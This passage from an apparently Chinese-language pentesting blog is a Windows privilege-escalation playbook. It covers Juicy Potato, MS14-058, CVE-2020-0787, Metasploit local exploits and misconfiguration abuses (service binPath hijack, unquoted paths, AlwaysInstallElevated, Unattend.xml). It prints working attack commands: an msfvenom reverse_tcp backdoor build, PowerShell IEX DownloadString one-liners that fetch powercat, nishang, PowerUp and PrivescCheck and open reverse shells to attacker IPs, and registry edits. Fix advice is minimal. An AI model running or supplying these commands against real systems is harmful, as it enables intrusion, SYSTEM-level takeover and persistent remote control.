#分析安装杀软</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn #列出已安装的补丁</span><br><span class="line">tasklist /svc | find &quot;TermService&quot; #获取服务pid</span><br><span class="line">netstat -ano |find &quot;pid&quot; #查看指定pid进程连接信息</span><br></pre></td></tr></table></figure><h3 id="windows-漏洞提权"><a href="#windows-漏洞提权" class="headerlink" title="windows 漏洞提权"></a>windows 漏洞提权</h3><p><strong>windows 漏洞提权流程</strong></p><p>能执行系统命令 &gt; 机器未打相关补丁 &gt; 打对应补丁 exp &gt; 获得服务器更高权限</p><p>传马优先传 aspx 的马因为 aspx 马权限更高</p><p>aspx 使用的是.net 技术。IIS 中默认不支持，ASPX 需要依赖于.net framework 而 ASP 只是脚本语言而已。ASP.NET 允许用户使用 IIS 建立网络服务。入侵的时候 asp 的木马一般是 guest 权限，APSX 的木马一般是 users 权限，iis6 默认以 network service 身份运行。iis5 默认是 aspnet ASP.NET, IIS 的权限机制非常复杂，对每一层应用，都有不同的权限控制。总之要求对 asp.net 开放相应权限，才可以让你的网站完成相应的服务。ASP.net 程序的访问权限由 ASPNET 的权限来决定。ASPNET 隶属于 Users 组。所以 ASPX 权限就要高一些。</p><p>如果管理员删除服务器组件 wscript.shell 无法在 asp 执行 cmd 命令 这个时候可以使用 aspx 的后门查看是否有权限执行系统 dos 命令</p><h3 id="windows-提权辅助"><a href="#windows-提权辅助" class="headerlink" title="windows 提权辅助"></a>windows 提权辅助</h3><p>windows 内核提权 exp <a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><p>提权辅助 根据补丁信息寻找可用提权 exp <a href="http://bugs.hacking8.com/tiquan">http://bugs.hacking8.com/tiquan</a></p><p>补丁及可用提权漏洞分析脚本 <a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p><p>通过上面的补丁查询，列出可用的 exp，在 webshell 里使用提权 exp 对服务器进行提权即可</p><h3 id="查询可写目录或者文件"><a href="#查询可写目录或者文件" class="headerlink" title="查询可写目录或者文件"></a>查询可写目录或者文件</h3><p>在确定可以执行 cmd 命令时，有些服务器会对目录进行权限设置，导致 iis_user 用户组没有权限对常见的目录进行写入和读取，这时可以用脚本对目录进行遍历扫描，得到可写目录然后上传或下载提权 exp，或者替换文件进行利用。</p><p>常见的脚本有 wt.asp 其中红色表示文件可替换、蓝色表示目录可写</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634017785/Xnip2021-10-12_13-49-24_jory3t.png"></p><p>.net 版本的 wt.aspx 因为 net 的权限比 asp 而且能访问注册表 所以除了常规扫描目录之外，还会读取注册表软件目录进行目录扫描</p><h2 id="CVE-2021-1675-Windows-Print-Spooler-提权"><a href="#CVE-2021-1675-Windows-Print-Spooler-提权" class="headerlink" title="CVE-2021-1675 Windows Print Spooler 提权"></a>CVE-2021-1675 Windows Print Spooler 提权</h2><p>CVE-2021-1675 可以本地提权、也可以提权域控，关于此提权可以看我另一篇博客，有详细复现教程</p><p>传送门：<a href="https://www.netssec.ml/post/CVE-2021-1675.html">https://www.netssec.ml/post/CVE-2021-1675.html</a></p><h2 id="CVE-2016-3225（MS16-075）-烂土豆-提权"><a href="#CVE-2016-3225（MS16-075）-烂土豆-提权" class="headerlink" title="CVE-2016-3225（MS16-075） 烂土豆 提权"></a>CVE-2016-3225（MS16-075） 烂土豆 提权</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞。成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级版本</p><p>注：烂土豆 (Rotten Potato) 提权是一个本地提权，是针对本地用户的，不能用于域用户</p><h3 id="洞影响版本"><a href="#洞影响版本" class="headerlink" title="洞影响版本"></a>洞影响版本</h3><p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-075">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-075</a></p><h3 id="漏洞-exp-下载"><a href="#漏洞-exp-下载" class="headerlink" title="漏洞 exp 下载"></a>漏洞 exp 下载</h3><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p><a href="https://github.com/uknowsec/JuciyPotato">https://github.com/uknowsec/JuciyPotato</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>上传 exp 至可写可执行目录</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634017785/Xnip2021-10-12_13-49-24_jory3t.png"></p><p>这个 exp 是支持 webshell 执行的，所以直接执行就可以获得 system 权限</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634018504/Xnip2021-10-12_14-00-42_sbnut2.png"></p><p>上线 cs 再提权</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634019913/Xnip2021-10-12_14-24-35_l6xevn.png"></p><p>注：可以直接使用 exp 执行后门文件，上线即为 system 权限会话</p><p>哥斯拉自带烂土豆提权上线 懒人必备 一定程度绕过杀软 某次 hw 使用意外发现</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634020998/Xnip2021-10-12_14-42-44_qa8u4m.png"></p><h2 id="CVE-2014-4113-MS14-058-提权"><a href="#CVE-2014-4113-MS14-058-提权" class="headerlink" title="CVE-2014-4113 (MS14-058) 提权"></a>CVE-2014-4113 (MS14-058) 提权</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Microsoft Windows 下的 win32k.sys 是 Windows 子系统的内核部分，是一个内核模式设备驱动程序，它包含有窗口管理器、后者控制窗口显示和管理屏幕输出等。如果 Windows 内核模式驱动程序不正确地处理内存中的对象，则存在一个特权提升漏洞。成功利用此漏洞的攻击者可以运行内核模式中的任意代码。攻击者随后可安装程序；查看、更改或删除数据；或者创建拥有完全管理权限的新帐户</p><h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>该漏洞影响所有 Windows x64，包括 Windows 7 和 Windows Server 2008 R2 及以下版本。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>将 exp 上传至可读可写目录</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634017785/Xnip2021-10-12_13-49-24_jory3t.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c c:\windows\debug\WIA\win64.exe whoami  #执行即可获得system权限</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634021627/Xnip2021-10-12_14-53-36_t70666.png"></p><p>exp 执行 cs 后门文件，直接获得 system 权限会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c c:\windows\debug\WIA\win64.exe  c:\windows\debug\WIA\backdoor.exe</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634021855/Xnip2021-10-12_14-57-00_cd4wct.png"></p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级系统版本</p><h2 id="CVE-2020-0787-提权"><a href="#CVE-2020-0787-提权" class="headerlink" title="CVE-2020-0787 提权"></a>CVE-2020-0787 提权</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>当 Windows Background Intelligent Transfer Service (BITS) 未能正确地处理符号链接时，存在权限提升漏洞。成功利用此漏洞的攻击者可以覆盖导致提升状态的目标文件。要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行巧尽心思构建的应用程序，利用此漏洞并控制受影响的系统。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0787">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0787</a></p><h3 id="漏洞-exp-下载-1"><a href="#漏洞-exp-下载-1" class="headerlink" title="漏洞 exp 下载"></a>漏洞 exp 下载</h3><p><a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases</a></p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个提权需要连接目标主机 3389，因为 exp 执行完会弹一个 system 权限的 cmd 窗口</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634023896/2881634023822_.pic_hd_rpaqmk.png"></p><p>可以利用这个 system 权限上线 cs 或者 msf 进行后渗透操作</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>升级系统版本</p><h2 id="msf-提权"><a href="#msf-提权" class="headerlink" title="msf 提权"></a>msf 提权</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>metasplit 是一款开源的安全漏洞检测工具，可以帮助安全和 IT 专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web 应用程序扫描，社会工程。团队合作等</p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 msf 生成 exe 后门文件（反向后门）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.46.2.124 lport=12345 -f exe &gt; y.exe</span><br></pre></td></tr></table></figure><p>msf 设置监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 10.46.2.124</span><br><span class="line">lhost =&gt; 172.16.61.2</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 12345</span><br><span class="line">lport =&gt; 12345</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p>将 msf 后门文件上传至可读可写目录执行获取反弹会话</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634025538/Xnip2021-10-12_15-58-46_yt8pqj.png"></p><p>getuid 权限很低，需要提权</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634025648/Xnip2021-10-12_16-00-39_e9iey3.png"></p><h3 id="windows-常见的权限提升模块"><a href="#windows-常见的权限提升模块" class="headerlink" title="windows 常见的权限提升模块"></a>windows 常见的权限提升模块</h3><p>ms14_058 内核模式驱动程序中的漏洞可能允许远程执行代码</p><p>ms16_016 WebDAV 本地提权漏洞 (CVE-2016-0051)</p><p>ms16_032 MS16-032 Secondary Logon Handle 本地提权漏漏洞</p><p>ms16_075 Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞</p><h3 id="msf-基础命令"><a href="#msf-基础命令" class="headerlink" title="msf 基础命令"></a>msf 基础命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ps  #列出进程</span><br><span class="line">background  #把session放置后台</span><br><span class="line">sessions #查看会话</span><br><span class="line">back #返回主界面</span><br><span class="line">shell #得到终端</span><br><span class="line">search #搜索模块</span><br><span class="line">show #列模块</span><br><span class="line">info #查看模块信息</span><br><span class="line">use #使用模块</span><br></pre></td></tr></table></figure><h3 id="查询系统补丁情况"><a href="#查询系统补丁情况" class="headerlink" title="查询系统补丁情况"></a>查询系统补丁情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to /Users/lin/.msf4/loot/20211012160507_default_10.2.14.45_enum_patches_916671.txt</span><br><span class="line">[+] KB2959936 installed on 11/21/2014</span><br><span class="line">[+] KB2894852 installed on 9/12/2021</span><br><span class="line">[+] KB2896496 installed on 11/21/2014</span><br><span class="line">[+] KB2919355 installed on 11/21/2014</span><br><span class="line">[+] KB2920189 installed on 11/21/2014</span><br><span class="line">[+] KB2928120 installed on 11/21/2014</span><br><span class="line">[+] KB2931358 installed on 11/21/2014</span><br><span class="line">[+] KB2931366 installed on 11/21/2014</span><br><span class="line">[+] KB2933826 installed on 11/21/2014</span><br><span class="line">[+] KB2938066 installed on 9/12/2021</span><br><span class="line">[+] KB2938772 installed on 11/21/2014</span><br><span class="line">[+] KB2949621 installed on 11/21/2014</span><br><span class="line">[+] KB2954879 installed on 11/21/2014</span><br><span class="line">[+] KB2958262 installed on 11/21/2014</span><br><span class="line">[+] KB2958263 installed on 11/21/2014</span><br><span class="line">...........</span><br></pre></td></tr></table></figure><p>可以使用 msf 提供提权建议的模块进行扫描从而辅助提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use  post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure><p>使用模块进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms16_075  #搜索ms16_075相关模块</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ms16_075_reflection_juicy #使用模块</span><br><span class="line">set session 1 #设置要提权的会话</span><br><span class="line">run #执行</span><br></pre></td></tr></table></figure><p>成功将普通 iis 用户提权至 system 权限</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634026643/55_upy0xa.png"></p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>由于系统是 X64 的，我们将获取到的会话迁移到 64 位进程中去，防止 session 断掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps  #查看进程</span><br></pre></td></tr></table></figure><p>随意迁移到一个 64 位的进程中即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 488 #迁移进程到pid为488的进程中</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634026881/Xnip2021-10-12_16-21-10_mi4ofq.png"></p><h2 id="交互-shell-与非交互-shell"><a href="#交互-shell-与非交互-shell" class="headerlink" title="交互 shell 与非交互 shell"></a>交互 shell 与非交互 shell</h2><h3 id="交互-shell"><a href="#交互-shell" class="headerlink" title="交互 shell"></a>交互 shell</h3><p>交互 shell 就是 shell 等待你的输入，并且立即执行你提交的命令。这种模式被称作交互式是因为 shell 与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当签退后，shell 也终止了。需要进行信息交互，例如输入某个信息会返回信息，你需要对其输入内容，输入会执行命令。例如 cmd 终端、msf 反弹后门 shell、nc 反弹 shell、这些都属于交互 shell</p><h3 id="非交互-shell"><a href="#非交互-shell" class="headerlink" title="非交互 shell"></a>非交互 shell</h3><p>shell 也可以运行在另外一种模式：非交互式模式，以 shell script (非交互) 方式执行。在这种模式下，shell 不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell 也就终止了。</p><h3 id="nc-反弹-shell-提权"><a href="#nc-反弹-shell-提权" class="headerlink" title="nc 反弹 shell 提权"></a>nc 反弹 shell 提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9002 #攻击者执行监听、监听9002端口</span><br></pre></td></tr></table></figure><p>上传 nc 到目标主机执行 nc 反弹 shell</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634031010/Xnip2021-10-12_17-29-55_jhdbsl.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwncat -l 9002 #我使用比较多的</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634031109/Xnip2021-10-12_17-31-35_q1vrne.png"></p><h3 id="powershell-反弹-shell-提权"><a href="#powershell-反弹-shell-提权" class="headerlink" title="powershell 反弹 shell 提权"></a>powershell 反弹 shell 提权</h3><p>powercat 是 netcat 的 powershell 版本</p><p>下载地址： <a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorh</span><br><span class="line">ino/powercat/master/powercat.ps1&#x27;); powercat -c 192.168.1.4 -p 9999 -e cmd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://10.46.2.124:8000/powercat.ps1&#x27;); powercat -c 10.46.2.124 -p 9002 -e cmd</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634031875/Xnip2021-10-12_17-44-09_votde7.png"></p><h3 id="nishang-反弹-shell"><a href="#nishang-反弹-shell" class="headerlink" title="nishang 反弹 shell"></a>nishang 反弹 shell</h3><p>Nishang <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> 是一个基于 PowerShell 的攻击框架，集合了一些 PowerShell 攻击脚本和有效载荷，可反弹 TCP&#x2F; UDP&#x2F; HTTP&#x2F;HTTPS&#x2F; ICMP 等类型 shell</p><p><strong>Reverse TCP shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/InvokePowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;http://192.168.0.195/nishang/Shells/InvokePowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.195 -port 6666</span><br></pre></td></tr></table></figure><p><strong>Reverse UDP shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;http://192.168.0.195/nishang/Shells/InvokePowerShellUdp.ps1&#x27;);</span><br><span class="line">Invoke-PowerShellUdp -Reverse -IPAddress 192.168.0.195 -port 53</span><br></pre></td></tr></table></figure><h2 id="windows-系统配置错误提权"><a href="#windows-系统配置错误提权" class="headerlink" title="windows 系统配置错误提权"></a>windows 系统配置错误提权</h2><h3 id="系统服务配置错误"><a href="#系统服务配置错误" class="headerlink" title="系统服务配置错误"></a>系统服务配置错误</h3><p>Windows 在系统启动时，会伴随着一些搞权限服务启动 (windows 服务是以 system 权限运行的) 倘若某些服务存在一些漏洞，那么就能够借此服务进行权限劫持，例如 DLL 劫持</p><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>windows 系统服务文件在操作系统启动时加载执行，并在后台调用可执行文件。如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，那么就可以替换该文件，并随着系统启动获得控制权限。windows 服务是以 system 权限运行的，其文件夹、文件和注册表 key-value 都是受强制访问控制保护的。但是在某些情况下，操作系统中依然存在一些没有得到有效保护的服务。</p><h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>PrivescCheck 列出可能存在问题的所有服务并分析能否利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/itm4n/PrivescCheck.git  #下载</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;http://10.46.2.124:8000/PrivescCheck.ps1&#x27;); InvokePrivescCheck&quot;</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634035143/Xnip2021-10-12_18-38-53_fd9a0y.png"></p><p>NT AUTHORITY\Authenticated Users 意味着普通用户可以对 usosvc 服务进行设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc query  UsoSvc  #查询服务状态</span><br><span class="line">sc stop  UsoSvc   #停止服务</span><br><span class="line">/c sc config usosvc binPath= &quot;C:\a.exe&quot; #劫持 a.exe 为cs后门文件</span><br><span class="line">sc start  UsoSvc  #启动服务</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634038349/Xnip2021-10-12_19-32-13_qgr0zz.png"></p><p>msf 利用</p><p>使用攻击模块 exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</p><p>service_permissions 模块会使用两种方式获取 system 权限，如果以管理员权限运行，会尝试创建并运行一个新的服务。如果当前权限不允许创建服务，则会判断哪些服务的文件或文件夹的权限有问题，并对其进行劫持在劫持服务时会创建一个可执行程序，其文件名和安装路径都是随机的。</p><h3 id="不带引号的服务路径提权"><a href="#不带引号的服务路径提权" class="headerlink" title="不带引号的服务路径提权"></a>不带引号的服务路径提权</h3><h4 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>当系统管理员配置 Windows 服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files\WinRAR\Rar.exe&quot; #有双引号的时候 正常执行Rar.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\WinRAR\Rar.exe #没有双引号的时候 windows会把空格前面的当做exe文件执行</span><br></pre></td></tr></table></figure><h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#使用PowerUp.ps1进行检测，会遍历出带有空格的文件路径</span><br><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;http://10.46.0.228/PowerUp.ps1&#x27;); InvokeAllChecks&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#或者使用命令</span><br><span class="line">wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr</span><br><span class="line">/i /v &quot;C:Windows&quot; |findstr/i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634093366/Xnip2021-10-13_10-49-09_aock2u.png"></p><p>如上图所示路径中存在空格，如果 c 盘有写入和执行权限的话，可以上传一个名为 Program.exe 的后门文件到 c 盘根目录下，重启服务器即可上线 msf。</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634093569/Xnip2021-10-13_10-52-36_syqden.png"></p><p>注：要设置 msf 进程自动迁移，不然 session 很容易掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set AutoRunScript migrate -f   #msf自动迁移进程</span><br></pre></td></tr></table></figure><h3 id="注册键-AlwaysInstallElevated"><a href="#注册键-AlwaysInstallElevated" class="headerlink" title="注册键 AlwaysInstallElevated"></a>注册键 AlwaysInstallElevated</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>允许低权限用户以 System 权限安装文件。如果启用此策略设置项，那么任何权限的用户都以 NT Authority\System 权限来安装恶意的 MSI 文件。 windows install 是 windows 操作系统的组件之一，专门用来管理配置软件服务。它除了是一个安装程序，还用于管理软件的安装、组件的添加、删除、监视文件的还原、通过回滚进行灾难恢复。windows install 通过 msiexec.exe 安装 MSI 文件，双击 MSI 文件就会<br>运行 msiexec.exe。 原理：是因为用户打开了 windows installer 特权安装功能。</p><h4 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#命令行修改注册表</span><br><span class="line">reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer /v</span><br><span class="line">AlwaysInstallElevated /t REG_DWORD /d 1</span><br><span class="line">Reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v</span><br><span class="line">AlwaysInstallElevated /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure><p>使用 PowerUp 检测注册表是否有设置 如果返回 true 证明可以利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/c PowerShell -nop -exec bypass IEX(New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;http://10.46.0.228/PowerUp.ps1&#x27;); GetRegAlwaysInstallElevated</span><br><span class="line">#权限过低就会返回false</span><br></pre></td></tr></table></figure><p>上传 C:\ProgramData\COMahawk64.exe 执行即可获取一个系统得账号和密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634108784/Xnip2021-10-13_15-06-07_xv2mdi.png"></p><h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>禁用注册表键 AlwaysInstallElevated</p><h3 id="自动安装配置文件提权"><a href="#自动安装配置文件提权" class="headerlink" title="自动安装配置文件提权"></a>自动安装配置文件提权</h3><h4 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>网络管理员在内网中给多台机器配置同一个环境的时候，一般会使用脚本进行批量部署，也就是会使用安装配置文件，这些文件中包含所有的安装配置信息，其中还有一些包含着本地管理员账号和密码。</p><h4 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /b /s c:\Unattend.xml #搜索Unattend.xml文件 Unattend.xml文件是使用了base64对管理员的密码进行编码的</span><br></pre></td></tr></table></figure><p>也可以使用 msf 的 post&#x2F;windows&#x2F;gather&#x2F;enum_unattend 对这个配置文件扫描</p><h2 id="本地-dll-劫持提权"><a href="#本地-dll-劫持提权" class="headerlink" title="本地 